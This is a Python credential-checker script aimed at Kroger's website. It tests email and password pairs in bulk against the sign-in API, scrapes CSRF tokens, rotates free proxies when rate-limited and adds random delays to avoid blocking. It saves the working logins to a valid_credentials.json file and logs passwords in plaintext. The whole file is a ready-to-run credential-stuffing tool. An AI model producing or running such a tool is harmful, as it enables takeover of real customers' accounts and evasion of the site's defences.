import requests
from fp.fp import FreeProxy
import random
import time
import json
import logging
import re
from typing import List, Dict
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class KrogerChecker:
    def __init__(self, use_proxy: bool = True):
        self.use_proxy = use_proxy
        self.proxy = None
        self.session = requests.Session()
        self.session.verify = False
        self.valid_creds = []
        self.invalid_creds = []
        
        if self.use_proxy:
            self._rotate_proxy(strict=True)
            
    def _rotate_proxy(self, strict=False):
        """Get a fresh proxy from FreeProxy with strict mode"""
        max_retries = 5 if strict else 3
        for attempt in range(max_retries):
            try:
                self.proxy = FreeProxy(rand=True, timeout=5).get()
                if self.proxy:
                    logger.info(f"Trying proxy: {self.proxy}")
                    self.session.proxies = {
                        'http': self.proxy,
                        'https': self.proxy
                    }
                    # Test connection
                    try:
                        test_response = self.session.get(
                            'https://www.kroger.com',
                            timeout=10,
                            headers={'User-Agent': 'Mozilla/5.0'}
                        )
                        if test_response.status_code == 200:
                            logger.info(f"Using proxy: {self.proxy}")
                            return True
                    except Exception as e:
                        logger.warning(f"Proxy test failed: {e}")
                        continue
            except Exception as e:
                logger.warning(f"Proxy attempt {attempt + 1} failed: {e}")
                time.sleep(1)
        
        if strict:
            logger.error("No working proxy found - skipping credential")
            return False
        logger.warning("Continuing without proxy")
        self.proxy = None
        self.session.proxies = {}
        return True
            
    def _get_auth_token(self, email: str, password: str) -> str:
        """Attempt to get auth token with improved error handling"""
        max_retries = 2
        for attempt in range(max_retries):
            try:
                # Get login page
                login_page = self.session.get(
                    'https://www.kroger.com/signin',
                    headers={'User-Agent': 'Mozilla/5.0'},
                    timeout=15
                )
                
                # Extract CSRF token
                csrf_token = self._extract_csrf(login_page.text)
                if not csrf_token:
                    logger.error("Failed to extract CSRF token")
                    return None
                
                # Prepare login request
                payload = {
                    'email': email,
                    'password': password,
                    '_csrf': csrf_token
                }
                
                response = self.session.post(
                    'https://www.kroger.com/auth/api/login',
                    json=payload,
                    headers={
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Referer': 'https://www.kroger.com/signin'
                    },
                    timeout=15
                )
                
                # Handle response
                if response.status_code == 200:
                    if response.text.strip():  # Check if response has content
                        try:
                            data = response.json()
                            if isinstance(data, dict):
                                return data.get('token')
                            logger.error("Invalid JSON format received")
                        except ValueError as e:
                            logger.error(f"JSON decode error: {e}")
                            logger.debug(f"Response content: {response.text[:200]}")
                    else:
                        logger.error("Empty response from server")
                elif response.status_code in [403, 429]:
                    logger.warning("Rate limited, rotating proxy...")
                    if not self._rotate_proxy(strict=self.use_proxy):
                        return None
                    continue
                    
                return None
                    
            except requests.exceptions.RequestException as e:
                logger.error(f"Request failed: {e}")
                if attempt < max_retries - 1:
                    if not self._rotate_proxy(strict=self.use_proxy):
                        return None
                    time.sleep(2)
                    continue
                return None
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                return None
            
    def _extract_csrf(self, html: str) -> str:
        """Enhanced CSRF token extraction for Kroger's current website"""
        try:
            # New patterns based on current Kroger website structure
            patterns = [
                r'<meta\s+name="csrf-token"\s+content="([^"]+)"',  # Meta tag
                r'window\.__PRELOADED_STATE__\s*=\s*\{.*?"csrfToken":"([^"]+)"',  # JS state
                r'<input[^>]+name="_csrf"[^>]+value="([^"]+)"',  # Hidden input
                r'\"csrfToken\"\s*:\s*\"([^"]+)\"'  # JSON pattern
            ]
            
            for pattern in patterns:
                match = re.search(pattern, html, re.DOTALL)
                if match:
                    token = match.group(1)
                    if len(token) > 10:  # Basic validation
                        logger.debug(f"Found CSRF token using pattern: {pattern[:30]}...")
                        return token
            
            logger.warning("CSRF token not found using all patterns. Page may have changed.")
            logger.debug(f"Page snippet: {html[:500]}...")
            return None
            
        except Exception as e:
            logger.error(f"CSRF extraction error: {str(e)[:100]}")
            return None
            
    def check_credentials(self, email: str, password: str) -> bool:
        """Check if credentials are valid"""
        logger.info(f"Checking: {email}:{password}")
        
        token = self._get_auth_token(email, password)
        if token:
            logger.info(f"VALID: {email}:{password}")
            return True
            
        logger.info(f"INVALID: {email}:{password}")
        return False
        
    def check_single(self, email: str, password: str):
        """Check a single credential pair"""
        is_valid = self.check_credentials(email, password)
        result = {
            'email': email,
            'password': password,
            'valid': is_valid,
            'proxy': self.proxy
        }
        
        if is_valid:
            self.valid_creds.append(result)
        else:
            self.invalid_creds.append(result)
            
        return result
        
    def check_bulk(self, credentials: List[Dict[str, str]]):
        """Check multiple credentials from a list"""
        results = []
        for cred in credentials:
            result = self.check_single(cred['email'], cred['password'])
            results.append(result)
            
            if self.use_proxy and random.random() > 0.7:
                self._rotate_proxy(strict=True)
                
            time.sleep(random.uniform(1, 3))
            
        return results
        
    def save_results(self):
        """Save results to JSON files"""
        with open('valid_credentials.json', 'w') as f:
            json.dump(self.valid_creds, f, indent=2)
            
        with open('invalid_credentials.json', 'w') as f:
            json.dump(self.invalid_creds, f, indent=2)
            
        logger.info(f"Saved {len(self.valid_creds)} valid and {len(self.invalid_creds)} invalid credentials")
        
    def close(self):
        """Clean up resources"""
        self.session.close()

def main():
    print("Kroger Credential Checker (Final Version)")
    proxy_choice = input("Use proxies? (y/n): ").lower()
    use_proxy = proxy_choice == 'y'
    
    print("\n1. Check single credential")
    print("2. Check bulk credentials from file")
    choice = input("Select option (1/2): ")
    
    checker = KrogerChecker(use_proxy=use_proxy)
    
    try:
        if choice == '1':
            email = input("Email: ")
            password = input("Password: ")
            result = checker.check_single(email, password)
            print("\nResult:")
            print(json.dumps(result, indent=2))
            
        elif choice == '2':
            file_path = input("Enter credentials file path (JSON format): ")
            try:
                with open(file_path) as f:
                    credentials = json.load(f)
                    
                print(f"Checking {len(credentials)} credentials...")
                results = checker.check_bulk(credentials)
                
                print("\nSummary:")
                print(f"Valid: {len(checker.valid_creds)}")
                print(f"Invalid: {len(checker.invalid_creds)}")
                
                checker.save_results()
                
            except Exception as e:
                logger.error(f"Error loading credentials file: {e}")
                
        else:
            print("Invalid choice")
            
    finally:
        checker.close()

if __name__ == '__main__':
    main()